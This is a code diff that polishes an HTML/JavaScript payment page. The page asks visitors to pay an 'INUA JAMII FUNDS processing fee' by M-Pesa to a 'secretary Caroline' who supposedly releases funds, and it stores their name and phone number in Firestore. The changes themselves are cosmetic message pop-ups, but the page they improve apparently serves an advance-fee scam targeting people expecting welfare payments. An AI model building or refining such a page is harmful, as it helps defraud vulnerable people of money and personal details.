@@ -1,20 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Payment – Processing Fee</title>
-<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="style.css" />
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 <script src="firebase-config.js"></script>
 
+<style>
+/* Optional: You can add some smooth transition for messages */
+#copyMessage, #alertMessage {
+  transition: opacity 0.3s;
+}
+</style>
 
 </head>
 <body>
 
-<div class="container">
+<div class="container" style="position: relative;">
+
+  <!-- Message for copy confirmation -->
+  <div id="copyMessage" style="
+    position: absolute;
+    display: none;
+    background: #fffae6;
+    padding: 5px 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 14px;
+    z-index: 1000;
+  "></div>
+
+  <!-- Alert message above input fields -->
+  <div id="alertMessage" style="
+    position: absolute;
+    display: none;
+    background: #ffe6e6;
+    padding: 5px 10px;
+    border: 1px solid #f00;
+    border-radius: 4px;
+    font-size: 14px;
+    z-index: 1000;
+  "></div>
+
   <h2>MPESA PAYMENT INSTRUCTION</h2>
   <p>Please follow the steps below to pay your INUA JAMII FUNDS processing fee directly to our secretary Caroline in charge of approving and releasing funds:</p>
 
@@ -46,31 +77,60 @@
 
 <script>
 const userPhone = localStorage.getItem("userPhone");
-if(!userPhone) window.location.href="register.html";
+if (!userPhone) window.location.href = "register.html";
 
 const processingFee = 278;
 document.getElementById("feeAmount").innerText = processingFee;
 
 // Copy Till Number
-function copyTill(){
+function copyTill() {
   const till = document.getElementById("tillNumber").innerText;
-  navigator.clipboard.writeText(till).then(()=>{
-    alert("Copied");
-  }).catch(err=>{
+  const copyMsg = document.getElementById("copyMessage");
+  const btn = document.querySelector("button[onclick='copyTill()']");
+  const rect = btn.getBoundingClientRect();
+
+  navigator.clipboard.writeText(till).then(() => {
+    // Show message slightly above the button
+    copyMsg.innerText = "Copied!";
+    copyMsg.style.left = `${rect.left + window.scrollX}px`;
+    copyMsg.style.top = `${rect.top + window.scrollY - 30}px`; // 30px above
+    copyMsg.style.display = "block";
+
+    // Fade out after 2 seconds
+    setTimeout(() => {
+      copyMsg.style.display = "none";
+    }, 2000);
+  }).catch(err => {
     alert("Failed to copy, copy manually.");
   });
 }
 
-document.getElementById("payment1Form").addEventListener("submit", function(e){
+// Form submission with alert above input
+document.getElementById("payment1Form").addEventListener("submit", function(e) {
   e.preventDefault();
+
   const senderName = document.getElementById("senderName").value.trim();
   const senderPhone = document.getElementById("senderPhone").value.trim();
+  const alertMsgDiv = document.getElementById("alertMessage");
 
-  if(senderName.length < 2 || senderPhone.length < 10){
-    alert("Enter valid name and phone");
+  if (senderName.length < 2 || senderPhone.length < 10) {
+    // Show alert slightly above the name input
+    const nameInputRect = document.getElementById("senderName").getBoundingClientRect();
+
+    alertMsgDiv.innerText = "Enter valid name and phone";
+    alertMsgDiv.style.left = `${nameInputRect.left + window.scrollX}px`;
+    alertMsgDiv.style.top = `${nameInputRect.top + window.scrollY - 30}px`; // 30px above
+    alertMsgDiv.style.display = "block";
+
+    // Hide after 2 seconds
+    setTimeout(() => {
+      alertMsgDiv.style.display = "none";
+    }, 2000);
+
     return;
   }
 
+  // Proceed with your existing code
   db.collection("users").doc(userPhone).update({
     firstPayment: {
       amount: processingFee,
@@ -82,9 +142,9 @@ document.getElementById("payment1Form").addEventListener("submit", function(e){
       required: true,
       status: "pending"
     }
-  }).then(()=>{
-    window.location.href="payment1.html";
-  }).catch(err=>{
+  }).then(() => {
+    window.location.href = "payment1.html";
+  }).catch(err => {
     alert("Error submitting payment. Try again.");
     console.error(err);
   });
